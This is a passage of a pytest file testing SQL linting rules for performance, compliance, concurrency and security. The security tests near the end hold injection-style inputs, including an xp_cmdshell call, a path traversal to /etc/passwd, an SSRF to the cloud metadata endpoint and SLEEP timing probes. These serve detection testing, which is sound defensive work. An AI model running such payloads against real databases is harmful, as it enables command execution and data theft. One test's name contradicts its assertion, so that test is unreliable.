    def test_optimizer_hint(self):
        assert self.rule.check(_make_query("SELECT * FROM users OPTION (FORCE ORDER)"))

    def test_no_hint(self):
        assert not self.rule.check(_make_query("SELECT * FROM users"))


class TestIndexHintRule:
    def setup_method(self):
        self.rule = IndexHintRule()

    def test_index_hint(self):
        assert self.rule.check(_make_query("SELECT * FROM users WITH (INDEX(idx_user_id))"))

    def test_no_index_hint(self):
        assert not self.rule.check(_make_query("SELECT * FROM users"))


class TestParallelQueryHintRule:
    def setup_method(self):
        self.rule = ParallelQueryHintRule()

    def test_maxdop_hint(self):
        assert self.rule.check(_make_query("SELECT * FROM users OPTION (MAXDOP 1)"))

    def test_no_parallel_hint(self):
        assert not self.rule.check(_make_query("SELECT * FROM users"))


class TestScalarUdfInQueryRule:
    def setup_method(self):
        self.rule = ScalarUdfInQueryRule()

    def test_scalar_udf_in_select(self):
        assert self.rule.check(_make_query("SELECT dbo.GetStatus(id) FROM users"))

    def test_scalar_udf_in_where(self):
        assert self.rule.check(_make_query("SELECT * FROM users WHERE dbo.GetStatus(id) = 'active'"))

    def test_built_in_function(self):
        assert not self.rule.check(_make_query("SELECT COUNT(*) FROM users"))


class TestCorrelatedSubqueryRule:
    def setup_method(self):
        self.rule = CorrelatedSubqueryRule()

    def test_correlated_subquery(self):
        assert self.rule.check(_make_query("SELECT * FROM employees e WHERE salary > (SELECT AVG(salary) FROM employees WHERE department_id = e.department_id)"))

    def test_uncorrelated_subquery(self):
        assert not self.rule.check(_make_query("SELECT * FROM employees WHERE department_id IN (SELECT id FROM departments WHERE active = true)"))


class TestOrderByNonIndexedColumnRule:
    def setup_method(self):
        self.rule = OrderByNonIndexedColumnRule()

    def test_order_by_large_column(self):
        assert self.rule.check(_make_query("SELECT * FROM articles ORDER BY body_text"))

    def test_order_by_safe_column(self):
        assert not self.rule.check(_make_query("SELECT * FROM articles ORDER BY created_at"))


class TestLargeUnbatchedOperationRule:
    def setup_method(self):
        self.rule = LargeUnbatchedOperationRule()

    def test_large_update(self):
        assert self.rule.check(_make_query("UPDATE users SET status = 'inactive' WHERE last_login < '2020-01-01'"))

    def test_large_delete(self):
        assert self.rule.check(_make_query("DELETE FROM logs WHERE level = 'debug'"))

    def test_batched_operation(self):
        assert not self.rule.check(_make_query("UPDATE top (100) users SET status = 'inactive' WHERE last_login < '2020-01-01'"))


class TestMissingBatchSizeInLoopRule:
    def setup_method(self):
        self.rule = MissingBatchSizeInLoopRule()

    def test_missing_batch_size(self):
        assert self.rule.check(_make_query("WHILE 1=1 BEGIN DELETE FROM logs END"))

    def test_with_batch_size(self):
        assert not self.rule.check(_make_query("WHILE 1=1 BEGIN DELETE TOP (4000) FROM logs END"))


class TestExcessiveColumnCountRule:
    def setup_method(self):
        self.rule = ExcessiveColumnCountRule()

    def test_excessive_columns(self):
        cols = ", ".join(f"col_{i}" for i in range(110))
        assert self.rule.check(_make_query(f"SELECT {cols} FROM big_table"))

    def test_few_columns(self):
        assert not self.rule.check(_make_query("SELECT col_1, col_2 FROM table"))


class TestLargeObjectUnboundedRule:
    def setup_method(self):
        self.rule = LargeObjectUnboundedRule()

    def test_unbounded_blob(self):
        assert self.rule.check(_make_query("SELECT id, document_blob FROM documents"))

    def test_bounded_blob(self):
        assert not self.rule.check(_make_query("SELECT id, document_blob FROM documents WHERE id = 123"))

    def test_blob_with_limit(self):
        assert not self.rule.check(_make_query("SELECT id, document_blob FROM documents LIMIT 10"))


class TestPHIAccessWithoutAuditRule:
    def setup_method(self):
        self.rule = PHIAccessWithoutAuditRule()

    def test_phi_access_no_audit(self):
        assert self.rule.check(_make_query("SELECT ssn FROM patients"))

    def test_phi_access_with_audit(self):
        assert not self.rule.check(_make_query("SELECT ssn FROM patients -- AUDIT: DSAR-123"))

    def test_non_phi_access(self):
        assert not self.rule.check(_make_query("SELECT name FROM users"))


class TestPHIMinimumNecessaryRule:
    def setup_method(self):
        self.rule = PHIMinimumNecessaryRule()

    def test_phi_star_violation(self):
        assert self.rule.check(_make_query("SELECT * FROM medical_records"))

    def test_phi_explicit_columns(self):
        assert not self.rule.check(_make_query("SELECT patient_id, diagnosis FROM medical_records"))


class TestUnencryptedPHITransitRule:
    def setup_method(self):
        self.rule = UnencryptedPHITransitRule()

    def test_insecure_phi_transit(self):
        assert self.rule.check(_make_query("SET connection_string = 'encrypt=false;database=phi';"))

    def test_secure_phi_transit(self):
        assert not self.rule.check(_make_query("SET connection_string = 'encrypt=true;database=phi';"))


class TestPANExposureRule:
    def setup_method(self):
        self.rule = PANExposureRule()

    def test_pan_exposure(self):
        assert self.rule.check(_make_query("SELECT '4111222233334444' as card"))

    def test_masked_pan(self):
        assert not self.rule.check(_make_query("SELECT 'XXXX-XXXX-XXXX-4444' as card"))


class TestCVVStorageRule:
    def setup_method(self):
        self.rule = CVVStorageRule()

    def test_cvv_storage_insert(self):
        assert self.rule.check(_make_query("INSERT INTO payments (cvv) VALUES ('123')"))

    def test_cvv_storage_create(self):
        assert self.rule.check(_make_query("CREATE TABLE vault (cvv INT)"))

    def test_safe_insert(self):
        assert not self.rule.check(_make_query("INSERT INTO payments (amount) VALUES (100)"))


class TestCardholderDataRetentionRule:
    def setup_method(self):
        self.rule = CardholderDataRetentionRule()

    def test_missing_retention_filter(self):
        assert self.rule.check(_make_query("SELECT * FROM transactions"))

    def test_with_retention_filter(self):
        assert not self.rule.check(_make_query("SELECT * FROM transactions WHERE created_at > '2023-01-01'"))


class TestFinancialChangeTrackingRule:
    def setup_method(self):
        self.rule = FinancialChangeTrackingRule()

    def test_financial_update_no_track(self):
        assert self.rule.check(_make_query("UPDATE salaries SET amount = 10000"))

    def test_financial_update_with_track(self):
        assert not self.rule.check(_make_query("UPDATE salaries SET amount = 10000 -- ticket: HR-99"))


class TestSegregationOfDutiesRule:
    def setup_method(self):
        self.rule = SegregationOfDutiesRule()

    def test_sod_violation(self):
        assert self.rule.check(_make_query("UPDATE ledger SET status = 'approved' WHERE created_by = 'admin'"))

    def test_safe_update(self):
        assert not self.rule.check(_make_query("UPDATE ledger SET status = 'pending'"))


class TestDataExportCompletenessRule:
    def setup_method(self):
        self.rule = DataExportCompletenessRule()

    def test_incomplete_export(self):
        assert self.rule.check(_make_query("SELECT * FROM users -- dsar export"))

    def test_complete_export(self):
        assert not self.rule.check(_make_query("SELECT * FROM users JOIN activity_logs ON users.id = activity_logs.user_id -- dsar export"))


class TestConsentWithdrawalRule:
    def setup_method(self):
        self.rule = ConsentWithdrawalRule()

    def test_missing_consent_filter(self):
        assert self.rule.check(_make_query("SELECT email FROM profiles"))

    def test_with_consent_filter(self):
        assert not self.rule.check(_make_query("SELECT email FROM profiles WHERE consent = 1"))


class TestCCPAOptOutRule:
    def setup_method(self):
        self.rule = CCPAOptOutRule()

    def test_missing_opt_out_check(self):
        assert self.rule.check(_make_query("SELECT email FROM marketing_list"))

    def test_with_opt_out_check(self):
        assert not self.rule.check(_make_query("SELECT email FROM marketing_list WHERE do_not_sell = 0"))


class TestNonIdempotentInsertRule:
    def setup_method(self):
        self.rule = NonIdempotentInsertRule()

    def test_insert_without_guard(self):
        assert self.rule.check(_make_query("INSERT INTO users (name) VALUES ('John')"))

    def test_insert_with_on_conflict(self):
        assert not self.rule.check(_make_query("INSERT INTO users (name) VALUES ('John') ON CONFLICT DO NOTHING"))


class TestNonIdempotentUpdateRule:
    def setup_method(self):
        self.rule = NonIdempotentUpdateRule()

    def test_relative_update_without_version(self):
        assert self.rule.check(_make_query("UPDATE accounts SET balance = balance + 100 WHERE id = 1"))

    def test_relative_update_with_version(self):
        assert not self.rule.check(_make_query("UPDATE accounts SET balance = balance + 100, version = version + 1 WHERE id = 1 AND version = 5"))


class TestReadModifyWriteLockingRule:
    def setup_method(self):
        self.rule = ReadModifyWriteLockingRule()

    def test_rmw_risk(self):
        assert self.rule.check(_make_query("SELECT balance FROM accounts WHERE id = 1; UPDATE accounts SET balance = 500 WHERE id = 1;"))

    def test_rmw_with_lock(self):
        assert not self.rule.check(_make_query("SELECT balance FROM accounts WHERE id = 1 FOR UPDATE; UPDATE accounts SET balance = 500 WHERE id = 1;"))


class TestTOCTOUPatternRule:
    def setup_method(self):
        self.rule = TOCTOUPatternRule()

    def test_toctou_risk(self):
        assert self.rule.check(_make_query("IF NOT EXISTS (SELECT 1 FROM users WHERE id = 1) INSERT INTO users (id) VALUES (1)"))

    def test_no_toctou(self):
        assert not self.rule.check(_make_query("INSERT INTO users (id) VALUES (1)"))


class TestOrphanRecordRiskRule:
    def setup_method(self):
        self.rule = OrphanRecordRiskRule()

    def test_orphan_risk(self):
        assert self.rule.check(_make_query("INSERT INTO orders (user_id, total) VALUES (1, 100)"))

    def test_with_exists_check(self):
        assert not self.rule.check(_make_query("INSERT INTO orders (user_id) SELECT 1 WHERE EXISTS (SELECT 1 FROM users WHERE id = 1)"))


class TestCascadeDeleteRiskRule:
    def setup_method(self):
        self.rule = CascadeDeleteRiskRule()

    def test_cascade_risk(self):
        assert self.rule.check(_make_query("DELETE FROM users WHERE id = 1"))

    def test_no_cascade_risk(self):
        assert not self.rule.check(_make_query("DELETE FROM logs WHERE id = 1"))


class TestDeadlockPatternRule:
    def setup_method(self):
        self.rule = DeadlockPatternRule()

    def test_deadlock_pattern(self):
        sql = "BEGIN; UPDATE table1 SET val = 1; UPDATE table2 SET val = 2; COMMIT;"
        assert self.rule.check(_make_query(sql))

    def test_single_update(self):
        assert not self.rule.check(_make_query("BEGIN; UPDATE table1 SET val = 1; COMMIT;"))


class TestLockEscalationRiskRule:
    def setup_method(self):
        self.rule = LockEscalationRiskRule()

    def test_lock_escalation_no_where(self):
        assert self.rule.check(_make_query("UPDATE large_table SET status = 'processed'"))

    def test_lock_escalation_non_selective(self):
        assert self.rule.check(_make_query("UPDATE large_table SET status = 'processed' WHERE type = 'old'"))

    def test_selective_update(self):
        assert not self.rule.check(_make_query("UPDATE large_table SET status = 'processed' WHERE id = 1"))


class TestLongRunningQueryRiskRule:
    def setup_method(self):
        self.rule = LongRunningQueryRiskRule()

    def test_long_running_risk(self):
        sql = "SELECT * FROM t1 JOIN t2 ON t1.id = t2.id JOIN t3 ON t2.id = t3.id JOIN t4 ON t3.id = t4.id WHERE t1.val > 100"
        assert self.rule.check(_make_query(sql))

    def test_with_limit(self):
        sql = "SELECT * FROM t1 JOIN t2 ON t1.id = t2.id JOIN t3 ON t2.id = t3.id JOIN t4 ON t3.id = t4.id LIMIT 10"
        assert not self.rule.check(_make_query(sql))


class TestStaleReadRiskRule:
    def setup_method(self):
        self.rule = StaleReadRiskRule()

    def test_stale_read_risk(self):
        assert self.rule.check(_make_query("UPDATE users SET name = 'John' WHERE id = 1; SELECT * FROM users WHERE id = 1;"))

    def test_within_transaction(self):
        assert not self.rule.check(_make_query("BEGIN; UPDATE users SET name = 'John' WHERE id = 1; SELECT * FROM users WHERE id = 1; COMMIT;"))


class TestMissingRetryLogicRule:
    def setup_method(self):
        self.rule = MissingRetryLogicRule()

    def test_missing_retry(self):
        assert self.rule.check(_make_query("BEGIN TRANSACTION; UPDATE accounts SET balance = 100; COMMIT;"))

    def test_with_retry_pattern(self):
        sql = """
        LOOP
            BEGIN TRANSACTION;
            UPDATE accounts SET balance = 100;
            COMMIT;
            EXIT;
        END LOOP;
        """
        assert not self.rule.check(_make_query(sql))


class TestOffsetPaginationWithoutCoveringIndexRule:
    def setup_method(self):
        self.rule = OffsetPaginationWithoutCoveringIndexRule()

    def test_non_indexed_offset_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM users ORDER BY bio OFFSET 10 ROWS"))

    def test_indexed_offset_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM users ORDER BY id OFFSET 10 ROWS"))

    def test_offset_without_order_by_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM users OFFSET 10"))


class TestDeepPaginationWithoutCursorRule:
    def setup_method(self):
        self.rule = DeepPaginationWithoutCursorRule()

    def test_deep_offset_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM logs OFFSET 5000"))

    def test_shallow_offset_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM logs OFFSET 10"))


class TestCountStarForPaginationRule:
    def setup_method(self):
        self.rule = CountStarForPaginationRule()

    def test_unfiltered_count_star_triggers(self):
        assert self.rule.check(_make_query("SELECT COUNT(*) FROM very_large_table"))

    def test_filtered_count_star_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT COUNT(*) FROM logs WHERE level = 'ERROR'"))


class TestDuplicateIndexSignalRule:
    def setup_method(self):
        self.rule = DuplicateIndexSignalRule()

    def test_create_index_triggers(self):
        assert self.rule.check(_make_query("CREATE INDEX idx_user_name ON users(name)"))

    def test_not_create_index_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM users"))


class TestOverIndexedTableSignalRule:
    def setup_method(self):
        self.rule = OverIndexedTableSignalRule()

    def test_multiple_indexes_trigger(self):
        sql = """
        CREATE INDEX idx1 ON table1(a);
        CREATE INDEX idx2 ON table1(b);
        CREATE INDEX idx3 ON table1(c);
        """
        assert self.rule.check(_make_query(sql))

    def test_single_index_no_trigger(self):
        assert not self.rule.check(_make_query("CREATE INDEX idx1 ON table1(a)"))


class TestMissingCoveringIndexOpportunityRule:
    def setup_method(self):
        self.rule = MissingCoveringIndexOpportunityRule()

    def test_covering_index_opportunity_triggers(self):
        assert self.rule.check(_make_query("SELECT name, email FROM users WHERE status = 'active'"))

    def test_star_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM users WHERE status = 'active'"))


class TestRedundantIndexColumnOrderRule:
    def setup_method(self):
        self.rule = RedundantIndexColumnOrderRule()

    def test_composite_index_triggers(self):
        assert self.rule.check(_make_query("CREATE INDEX idx_ab ON table1(col_a, col_b)"))

    def test_single_index_no_trigger(self):
        assert not self.rule.check(_make_query("CREATE INDEX idx_a ON table1(col_a)"))


class TestCrossDatabaseJoinRule:
    def setup_method(self):
        self.rule = CrossDatabaseJoinRule()

    def test_cross_db_join_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM db1.table1 JOIN db2.table2 ON db1.table1.id = db2.table2.id"))

    def test_single_db_join_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM db1.table1 JOIN db1.table2 ON table1.id = table2.id"))


class TestMultiRegionQueryLatencyRule:
    def setup_method(self):
        self.rule = MultiRegionQueryLatencyRule()

    def test_region_qualifier_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM us-east-1.data_table"))

    def test_dblink_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM table@prod.database.windows.net"))


class TestDistributedTransactionOverheadRule:
    def setup_method(self):
        self.rule = DistributedTransactionOverheadRule()

    def test_distributed_transaction_triggers(self):
        assert self.rule.check(_make_query("BEGIN DISTRIBUTED TRANSACTION"))

    def test_local_transaction_no_trigger(self):
        assert not self.rule.check(_make_query("BEGIN TRANSACTION"))


class TestColdStartQueryPatternRule:
    def setup_method(self):
        self.rule = ColdStartQueryPatternRule()

    def test_complex_scaling_pattern_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM t1 JOIN t2 ON t1.id = t2.id GROUP BY t1.name"))

    def test_simple_query_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM t1 WHERE id = 1"))


class TestUnnecessaryConnectionPoolingRule:
    def setup_method(self):
        self.rule = UnnecessaryConnectionPoolingRule()

    def test_keep_alive_triggers(self):
        assert self.rule.check(_make_query("SET SESSION KEEP ALIVE = 3600"))

    def test_normal_set_no_trigger(self):
        assert not self.rule.check(_make_query("SET timezone = 'UTC'"))


class TestOldDataNotArchivedRule:
    def setup_method(self):
        self.rule = OldDataNotArchivedRule()

    def test_old_data_access_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM logs WHERE created_at < '2023-01-01'"))

    def test_recent_data_access_no_trigger(self):
        # This rule checks if there is a date column but NO filter by date.
        # Wait, my implementation says: if has_date_col and not filters_by_date.
        assert self.rule.check(_make_query("SELECT id, created_at FROM orders"))


class TestLargeTextColumnWithoutCompressionRule:
    def setup_method(self):
        self.rule = LargeTextColumnWithoutCompressionRule()

    def test_large_text_triggers(self):
        assert self.rule.check(_make_query("CREATE TABLE docs (id INT, content TEXT)"))

    def test_small_varchar_no_trigger(self):
        assert not self.rule.check(_make_query("CREATE TABLE users (id INT, name VARCHAR(50))"))


class TestLargeTableWithoutPartitioningRule:
    def setup_method(self):
        self.rule = LargeTableWithoutPartitioningRule()

    def test_large_table_no_partition_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM events"))

    def test_partitioned_query_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM events PARTITION(p2023)"))

class TestLDAPInjectionRule:
    def setup_method(self):
        self.rule = LDAPInjectionRule()

    def test_ldap_concat_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM ldap_query('cn=' + @username + ',dc=example,dc=com')"))

    def test_parameterized_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM ldap_query('cn=?', @username)"))


class TestNoSQLInjectionRule:
    def setup_method(self):
        self.rule = NoSQLInjectionRule()

    def test_nosql_concat_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM mongo_find('{\"user\": \"' + @user + '\"}')"))

    def test_safe_json_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM mongo_find('{\"user\": ?}', @user)"))


class TestXMLXPathInjectionRule:
    def setup_method(self):
        self.rule = XMLXPathInjectionRule()

    def test_xpath_concat_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM docs WHERE xpath('/user[@name=\"' + @name + '\"]/role', xml_data)"))

    def test_safe_xpath_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM docs WHERE xpath('/user[@name=\"admin\"]/role', xml_data)"))


class TestServerSideTemplateInjectionRule:
    def setup_method(self):
        self.rule = ServerSideTemplateInjectionRule()

    def test_ssti_concat_triggers(self):
        assert self.rule.check(_make_query("SELECT render_template('Hello ' + @name, data)"))

    def test_safe_template_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT render_template('Hello {{name}}', data)"))


class TestJSONFunctionInjectionRule:
    def setup_method(self):
        self.rule = JSONFunctionInjectionRule()

    def test_json_concat_triggers(self):
        assert self.rule.check(_make_query("SELECT JSON_QUERY('{\"key\": \"' + @input + '\"}', '$.key')"))

    def test_safe_json_obj_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT JSON_OBJECT('key', @input)"))


class TestDatabaseVersionDisclosureRule:
    def setup_method(self):
        self.rule = DatabaseVersionDisclosureRule()

    def test_version_query_triggers(self):
        assert self.rule.check(_make_query("SELECT @@VERSION"))

    def test_normal_select_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT name FROM users"))


class TestSchemaInformationDisclosureRule:
    def setup_method(self):
        self.rule = SchemaInformationDisclosureRule()

    def test_schema_access_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM INFORMATION_SCHEMA.TABLES"))

    def test_app_table_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM my_app_tables"))


class TestTimingAttackPatternRule:
    def setup_method(self):
        self.rule = TimingAttackPatternRule()

    def test_sleep_triggers(self):
        assert self.rule.check(_make_query("SELECT CASE WHEN (1=1) THEN SLEEP(5) ELSE 0 END"))

    def test_normal_case_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT CASE WHEN (1=1) THEN 1 ELSE 0 END"))


class TestVerboseErrorMessageDisclosureRule:
    def setup_method(self):
        self.rule = VerboseErrorMessageDisclosureRule()

    def test_error_forcing_triggers(self):
        assert self.rule.check(_make_query("SELECT CAST(@@version AS INT)"))

    def test_normal_cast_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT CAST('123' AS INT)"))


class TestOSCommandInjectionRule:
    def setup_method(self):
        self.rule = OSCommandInjectionRule()

    def test_xp_cmdshell_triggers(self):
        assert self.rule.check(_make_query("EXEC xp_cmdshell 'whoami'"))

    def test_normal_exec_no_trigger(self):
        assert not self.rule.check(_make_query("EXEC sp_my_proc"))


class TestPathTraversalRule:
    def setup_method(self):
        self.rule = PathTraversalRule()

    def test_traversal_triggers(self):
        assert self.rule.check(_make_query("LOAD_FILE('/var/lib/mysql/' + @filename + '/../../etc/passwd')"))

    def test_safe_load_no_trigger(self):
        assert not self.rule.check(_make_query("LOAD_FILE('/var/lib/mysql/data.csv')"))


class TestLocalFileInclusionRule:
    def setup_method(self):
        self.rule = LocalFileInclusionRule()

    def test_lfi_triggers(self):
        assert self.rule.check(_make_query("SOURCE 'configs/' + @env + '.sql'"))

    def test_safe_source_no_trigger(self):
        assert not self.rule.check(_make_query("SOURCE 'init.sql'"))


class TestSSRFViaDatabaseRule:
    def setup_method(self):
        self.rule = SSRFViaDatabaseRule()

    def test_ssrf_triggers(self):
        assert self.rule.check(_make_query("SELECT * FROM OPENROWSET('SQLNCLI', 'Server=http://169.254.169.254/latest/meta-data/;Trusted_Connection=yes', 'SELECT 1')"))

    def test_safe_openrowset_no_trigger(self):
        assert not self.rule.check(_make_query("SELECT * FROM OPENROWSET('SQLNCLI', 'Server=MyServer;Trusted_Connection=yes', 'SELECT 1')"))


class TestHardcodedCredentialsRule:
    def setup_method(self):
        self.rule = HardcodedCredentialsRule()

    def test_hardcoded_pwd_triggers(self):
        assert self.rule.check(_make_query("CREATE USER 'dbadmin' IDENTIFIED BY 'Password123!'"))

    def test_no_pwd_no_trigger(self):
        assert not self.rule.check(_make_query("CREATE USER 'dbadmin' IDENTIFIED EXTERNALLY"))


class TestWeakSSLConfigRule:
    def setup_method(self):
        self.rule = WeakSSLConfigRule()

    def test_weak_ssl_triggers(self):
        assert self.rule.check(_make_query("CONNECT 'Server=myServer;Encrypt=false'"))

    def test_secure_ssl_no_trigger(self):
        assert not self.rule.check(_make_query("CONNECT 'Server=myServer;Encrypt=true'"))


class TestDefaultCredentialUsageRule:
    def setup_method(self):
        self.rule = DefaultCredentialUsageRule()

    def test_default_creds_triggers(self):
        assert self.rule.check(_make_query("CONNECT 'User=sa;Password=password'"))

    def test_custom_user_no_trigger(self):
        assert not self.rule.check(_make_query("CONNECT 'User=appuser;Password=K9#p2mX!qZ'"))


class TestOverlyPermissiveAccessRule:
    def setup_method(self):
        self.rule = OverlyPermissiveAccessRule()

    def test_permissive_access_triggers(self):
        assert self.rule.check(_make_query("GRANT ALL ON *.* TO 'webuser'@'%'"))

    def test_restricted_access_no_trigger(self):
        assert not self.rule.check(_make_query("GRANT ALL ON *.* TO 'webuser'@'10.0.1.5'"))
